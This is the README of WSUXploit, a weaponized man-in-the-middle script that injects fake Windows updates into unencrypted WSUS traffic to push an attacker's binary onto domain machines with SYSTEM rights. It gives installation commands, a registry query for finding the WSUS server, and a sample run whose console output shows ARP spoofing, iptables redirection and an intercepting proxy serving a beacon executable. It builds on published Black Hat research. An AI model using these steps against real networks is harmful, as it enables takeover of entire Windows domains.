# WSUXploit

Written by Marcio Almeida to weaponize the use of [WSUSpect Proxy](https://github.com/ctxis/wsuspect-proxy/) created by Paul Stone and Alex Chapman in 2015 and public released by [Context Information Security](http://www.contextis.com)

## Summary

This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.
It is based on the WSUSpect Proxy application that was introduced to public on the Black Hat USA 2015 presentation, 'WSUSpect – Compromising the Windows Enterprise via Windows Update'

Please read the White Paper and the presentation slides listed below:

- White paper: http://www.contextis.com/documents/161/CTX_WSUSpect_White_Paper.pdf
- Slides: http://www.contextis.com/documents/162/WSUSpect_Presentation.pdf

## Prerequisites and Installation

You'll need install some programs used by this attack. You can do this by running:
```
sudo apt-get install samba dsniff iptables python
```

PS: Kali Linux builds already have all the before mentioned dependencies.

WSUSpect Proxy requires the Python Twisted library. You can install it by running:
```
pip install twisted
```

Clone this repository and the WSUSpect Proxy repository. You can do it by running:
```
# clone WSUXploit repository
git clone https://github.com/pimps/wsuxploit.git

# enter on wsuxploit directory
cd wsuxploit

# clone WSUSpect Proxy repository
git clone https://github.com/ctxis/wsuspect-proxy.git
```

You're ready to go now :-)

## Usage

First things first...

Discover the WSUS address inside of the network that you're attacking and verify if it uses http protocol. If yes, you can use this exploit to get SYSTEM access to any windows target inside of that domain.

If you already have access to a Domain Machine, you can easily get the address of the WSUS server executing the following command:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

You should see a response similar to that:

```
WUServer   REG_SZ  http://10.1.1.1:8535/
```

After confirm that the network you're attacking uses HTTP for Windows Update, you're good to go.

```
root@kali-mini:/tmp/wsuxploit# ./wsuxploit.sh 
 __      __  _____________ _______  ___      .__         .__  __   
/  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
\   \/\/   /\_____  \|    |   /\     /\____ \|  |  /  _ \|  \   __\ 
 \        / /        \    |  / /     \|  |_> >  |_(  <_> )  ||  |  
  \__/\  / /_______  /______/ /___/\  \   __/|____/\____/|__||__|  
       \/          \/               \_/__|                         by pimps
Usage:
./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>

Example:
./wsuxploit.sh 192.168.0.101 10.0.0.85 80 /tmp/payload.exe

root@kali-mini:/tmp/wsuxploit# ./wsuxploit.sh 192.168.0.101 10.1.1.1 8535 /tmp/beacon.exe
 __      __  _____________ _______  ___      .__         .__  __   
/  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
\   \/\/   /\_____  \|    |   /\     /\____ \|  |  /  _ \|  \   __\ 
 \        / /        \    |  / /     \|  |_> >  |_(  <_> )  ||  |  
  \__/\  / /_______  /______/ /___/\  \   __/|____/\____/|__||__|  
       \/          \/               \_/__|                         by pimps
[*] Preparing exploit files...
[*] Spoofing arp replies...
[*] Turning on IP forwarding...
[*] Set iptables rules for SYN packets...
[*] Running WSUSpect proxy...
2017-06-30 09:46:59+1000 [-] Log opened.
2017-06-30 09:46:59+1000 [-] InterceptingProxyFactory starting on 9090
2017-06-30 09:46:59+1000 [-] Starting factory <intercepting_proxy.InterceptingProxyFactory instance at 0xb650ce8c>

```

Wait for the Auto-Update requests, they happen by default every 23h and for the Important Update installs, they happen by default every 24h.
